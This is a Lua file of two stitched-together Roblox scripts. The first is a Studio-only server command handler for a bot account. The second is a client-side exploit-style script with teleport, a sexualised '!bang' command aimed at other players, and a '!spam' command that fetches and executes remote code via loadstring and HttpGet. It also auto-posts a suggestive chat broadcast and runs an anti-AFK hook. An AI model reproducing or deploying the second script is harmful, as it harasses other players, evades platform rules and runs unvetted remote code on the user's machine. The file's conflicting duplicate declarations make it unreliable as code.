-- bot_command_handler.server.lua
-- Server-side command handler for a two-account bot architecture (Roblox Studio)
-- Place this in ServerScriptService. This uses in-game mechanics only (following via MoveTo,
-- chat bubbles via Chat:Chat, simple test action). Replace/extend actions as needed.
-- WARNING: Do NOT use this to automate other accounts outside of Studio or in ways that
-- violate Roblox Terms of Use.

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ChatService = game:GetService("Chat")

local CONFIG = {
    MainUser = "agrawalgamingyt1",   -- username (string) of the controller player in the game
    BotUser = "krishnad46ykabot",     -- username (string) of the bot player in the game
    Prefix = "!"                -- command prefix
}

local botPlayer = nil
local mainPlayer = nil
local following = false
local followTarget = nil
local followConnection = nil

local STARTUP_MESSAGE = "---------------------------------waiting for krishna d4dy command________________________"

local function findPlayerByName(name)
    if not name then return nil end
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then
            return p
        end
    end
    return nil
end

local function sendChatFromBot(text, recipientPlayer)
    if not botPlayer or not botPlayer.Character then return false end
    local char = botPlayer.Character
    local head = char:FindFirstChild("Head")
    if head then
        -- Sends a chat bubble from the bot's head (visible in the server)
        pcall(function()
            ChatService:Chat(head, text, Enum.ChatColor.Blue)
        end)
        return true
    end
    return false
end

local function startFollowing(targetPlayer)
    if not botPlayer or not botPlayer.Character or not targetPlayer or not targetPlayer.Character then
        return false, "bot or target missing"
    end
    following = true
    followTarget = targetPlayer

    -- Stop previous connection if any
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end

    local humanoid = botPlayer.Character:FindFirstChildWhichIsA("Humanoid")
    if not humanoid then return false, "bot humanoid missing" end

    followConnection = RunService.Heartbeat:Connect(function()
        if not following or not followTarget or not followTarget.Character then return end
        local targetRoot = followTarget.Character:FindFirstChild("HumanoidRootPart")
        local botRoot = botPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetRoot and botRoot and humanoid then
            -- MoveTo the target's current position (simple following)
            humanoid:MoveTo(targetRoot.Position)
        end
    end)

    return true
end

local function stopFollowing()
    following = false
    followTarget = nil
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
    return true
end

local function performTestingAction()
    if not botPlayer or not botPlayer.Character then return false end
    local humanoid = botPlayer.Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        -- Simple test: make the Bot jump (or play animation if you add one)
        humanoid.Jump = true
        return true
    end
    return false
end

local function getStatus()
    return {
        running = true,
        following = following,
        followTarget = (followTarget and followTarget.Name) or nil,
        main = CONFIG.MainUser,
        bot = CONFIG.BotUser
    }
end

local function handleCommand(senderName, rawMessage)
    if senderName:lower() ~= CONFIG.MainUser:lower() then
        -- ignore commands from others
        return
    end

    if not rawMessage:match("^" .. CONFIG.Prefix) then return end

    local body = rawMessage:sub(#CONFIG.Prefix + 1)
    local parts = {}
    for w in body:gmatch("%S+") do table.insert(parts, w) end
    local cmd = (parts[1] or ""):lower()

    if cmd == "follow" then
        local targetName = parts[2]
        if not targetName then
            sendChatFromBot("Usage: !follow <PlayerName>", nil)
            return
        end
        local targetP = findPlayerByName(targetName)
        if not targetP then
            sendChatFromBot("Target player not found: " .. targetName, nil)
            return
        end
        stopFollowing()
        local ok, err = startFollowing(targetP)
        if ok then
            sendChatFromBot("Started following " .. targetP.Name, nil)
        else
            sendChatFromBot("Follow failed: " .. tostring(err), nil)
        end

    elseif cmd == "msg" or cmd == "message" then
        local targetName = parts[2]
        if not targetName then
            sendChatFromBot("Usage: !msg <PlayerName> <message...>", nil)
            return
        end
        local message = table.concat(parts, " ", 3)
        if message == "" then
            sendChatFromBot("Provide a message to send", nil)
            return
        end
        -- Option: send as bot in chat (global bubble). To whisper, implement your own UI or RemoteEvent.
        local targetP = findPlayerByName(targetName)
        if not targetP then
            sendChatFromBot("Target player not found: " .. targetName, nil)
            return
        end
        sendChatFromBot(string.format("To %s: %s", targetP.Name, message), nil)

    elseif cmd == "test" then
        local ok = performTestingAction()
        sendChatFromBot("Test action " .. (ok and "performed" or "failed"), nil)

    elseif cmd == "stop" then
        stopFollowing()
        sendChatFromBot("Stopped actions", nil)

    elseif cmd == "status" then
        local s = getStatus()
        local msg = string.format("status: following=%s followTarget=%s bot=%s",
            tostring(s.following), tostring(s.followTarget or "none"), tostring(s.bot))
        sendChatFromBot(msg, nil)

    elseif cmd == "setbot" then
        local newBot = parts[2]
        if not newBot then
            sendChatFromBot("Usage: !setbot <BotPlayerName>", nil)
            return
        end
        CONFIG.BotUser = newBot
        sendChatFromBot("BotUser updated to " .. newBot, nil)
        -- refresh botPlayer reference
        botPlayer = findPlayerByName(CONFIG.BotUser)

    else
        sendChatFromBot("Unknown command: " .. tostring(cmd), nil)
    end
end

-- Hook up chat listeners for MainUser when they join
local function onPlayerAdded(player)
    -- store references if names match
    if player.Name:lower() == CONFIG.MainUser:lower() then
        mainPlayer = player
    end
    if player.Name:lower() == CONFIG.BotUser:lower() then
        botPlayer = player
        -- when bot player spawns, send the startup waiting text
        if botPlayer.Character then
            sendChatFromBot(STARTUP_MESSAGE, nil)
        end
        botPlayer.CharacterAdded:Connect(function()
            -- slight delay to let character appear
            wait(0.5)
            sendChatFromBot(STARTUP_MESSAGE, nil)
        end)
    end

    -- Listen to chat from everyone but command handling will ignore non-main users
    player.Chatted:Connect(function(message)
        -- message: string, player.Name is sender
        handleCommand(player.Name, message)
    end)
end

-- Clean up references when players leave
local function onPlayerRemoving(player)
    if player == mainPlayer then mainPlayer = nil end
    if player == botPlayer then
        botPlayer = nil
        stopFollowing()
    end
    if followTarget == player then
        stopFollowing()
    end
end

-- Wire up existing players and events
for _, p in pairs(Players:GetPlayers()) do
    onPlayerAdded(p)
end
Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)

print("bot_command_handler.server.lua loaded. Config:", CONFIG)
-- ====================================================================
-- CONFIGURATION & CONFIG MATRIX
-- ====================================================================
local MAIN_ACCOUNT = "agrawalgamingyt1"
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local VirtualUser = game:GetService("VirtualUser")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local mainPlayer = Players:FindFirstChild(MAIN_ACCOUNT)
local following = false
local followConnection = nil

-- Visual notification on bot screen
pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "Bot Active",
        Text = "System online. Awaiting agrawalgamingyt1...",
        Duration = 5
    })
end)

-- Auto-Broadcast on script load
task.spawn(function()
    task.wait(3)
    pcall(function()
        local generalChannel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if generalChannel then
            generalChannel:SendAsync("waiting for krishna daddy command")
        else
            local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
            if chatRemote then
                chatRemote:FireServer("waiting for krishna daddy command", "All")
            end
        end
    end)
end)

-- ====================================================================
-- CORE UTILITY FUNCTIONS
-- ====================================================================

local function findTargetPlayer(nameString)
    if not nameString or nameString == "" then return nil end
    for _, p in ipairs(Players:GetPlayers()) do
        if string.sub(p.Name:lower(), 1, #nameString) == nameString:lower() or 
           string.sub(p.DisplayName:lower(), 1, #nameString) == nameString:lower() then
            return p
        end
    end
    return nil
end

local function stopFollowing()
    following = false
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
end

-- ====================================================================
-- REFIXED COMMAND INTERPRETER
-- ====================================================================
local function handleCommand(message)
    local args = string.split(message, " ")
    if #args == 0 or not args[1] then return end
    
    local cmd = args[1]:lower()
    local targetName = args[2]
    
    local character = Players.LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    
    if not character or not humanoid or not rootPart then return end

    -- Command: !follow (Runs on a 0.1s interval loop instead of every frame)
    if cmd == "!follow" then
        mainPlayer = Players:FindFirstChild(MAIN_ACCOUNT)
        if not mainPlayer then return end
        stopFollowing()
        following = true
        
        task.spawn(function()
            while following and task.wait(0.1) do
                local mainChar = mainPlayer.Character
                local mainRoot = mainChar and mainChar:FindFirstChild("HumanoidRootPart")
                if mainRoot and rootPart and humanoid then
                    humanoid:MoveTo(mainRoot.Position)
                end
            end
        end)

    -- Command: !stop
    elseif cmd == "!stop" then
        stopFollowing()
        humanoid:MoveTo(rootPart.Position)

    -- Command: !bring
    elseif cmd == "!bring" then
        mainPlayer = Players:FindFirstChild(MAIN_ACCOUNT)
        if not mainPlayer then return end
        local mainChar = mainPlayer.Character
        local mainRoot = mainChar and mainChar:FindFirstChild("HumanoidRootPart")
        if mainRoot then
            rootPart.CFrame = mainRoot.CFrame * CFrame.new(0, 0, 2)
        end

    -- Command: !teleport / !tp
    elseif cmd == "!teleport" or cmd == "!tp" then
        if not targetName then return end
        local targetPlayer = findTargetPlayer(targetName)
        if targetPlayer and targetPlayer.Character then
            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 2)
            end
        end

    -- Command: !bang [target]
    elseif cmd == "!bang" then
        if not targetName then return end
        local targetPlayer = findTargetPlayer(targetName)
        if targetPlayer and targetPlayer.Character then
            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 1)
            end
        end

    -- Command: !spam [target]
    elseif cmd == "!spam" then
        if not targetName then return end
        local targetPlayer = findTargetPlayer(targetName)
        if targetPlayer then
            _G.SpamTarget = targetPlayer.Name 
            task.spawn(function()
                pcall(function()
                    loadstring(game:HttpGet("https://rawscripts.net"))()
                end)
            end)
        end

    -- Command: !kill
    elseif cmd == "!kill" then
        stopFollowing()
        humanoid.Health = 0
    end
end

-- ====================================================================
-- EVENT LISTENERS & HOOKS
-- ====================================================================
local function setupListener(player)
    if player.Name == MAIN_ACCOUNT then
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "Connection Secured",
                Text = "Master agrawalgamingyt1 Connected!",
                Duration = 7
            })
        end)
        player.Chatted:Connect(handleCommand)
    end
end

for _, p in ipairs(Players:GetPlayers()) do setupListener(p) end
Players.PlayerAdded:Connect(setupListener)

-- Safe Anti-AFK Hook
Players.LocalPlayer.Idled:Connect(function()
    pcall(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new(0,0))
    end)
end)
